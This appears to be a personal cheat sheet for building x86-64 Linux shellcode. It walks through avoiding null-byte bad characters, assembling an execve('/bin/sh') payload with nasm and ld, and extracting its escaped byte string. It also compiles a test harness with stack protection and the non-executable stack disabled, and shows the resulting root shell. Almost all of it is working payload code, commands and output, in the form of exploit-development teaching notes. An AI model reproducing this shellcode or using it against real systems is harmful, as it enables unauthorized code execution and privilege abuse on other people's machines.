# Links
https://filippo.io/linux-syscall-table/
http://radare.today/
http://shell-storm.org/shellcode/

# Convert string to reverse hex
$ python2 input_encode.py /bin/sh
68732f6e69622f

# Badchars 0x00, 0x0A, 0x0D
$ rasm2 -a x86 -b 64 'push  0x00'
6a00

$ rasm2 -a x86 -b 64 'mov rax, 68732f6e69622f; push rax'
48b82f62696e2f73680050 # here we have 0x00, it will break our shell

# We can change string a little with adding double slash //
$ python2 input_encode.py /bin//sh
68732f2f6e69622f

$ rasm2 -a x86 -b 64 'mov rax, 0x68732f2f6e69622f; push rax'
48b82f62696e2f2f736850 # no badchars, it will works

# Complit and build shellcode.asm
$ nasm -f elf64 shellcode.asm
$ ld -m elf_x86_64 -s -o shellcode shellcode.o

$ objdump -d shellcode
shellcode:     file format elf64-x86-64
0000000000400080 <.text>:
  400080:       48 31 d2                xor    %rdx,%rdx
  400083:       52                      push   %rdx
  400084:       48 b8 2f 62 69 6e 2f    movabs $0x68732f2f6e69622f,%rax
  40008b:       2f 73 68
  40008e:       50                      push   %rax
  40008f:       48 89 e7                mov    %rsp,%rdi
  400092:       52                      push   %rdx
  400093:       57                      push   %rdi
  400094:       48 89 e6                mov    %rsp,%rsi
  400097:       48 31 c0                xor    %rax,%rax
  40009a:       b0 3b                   mov    $0x3b,%al
  40009c:       0f 05                   syscall

# Create shellcode sting
for i in `objdump -d shellcode|tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$'`; do echo -n "\x$i"; done

\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05

# Test our new shellcode
gcc -m64 -fno-stack-protector -z execstack -o shellcode_test shellcode_test.c

# Execute and check
$ ./shellcode
sh-4.3$ id
uid=0(root) gid=0(root) groups=0(root)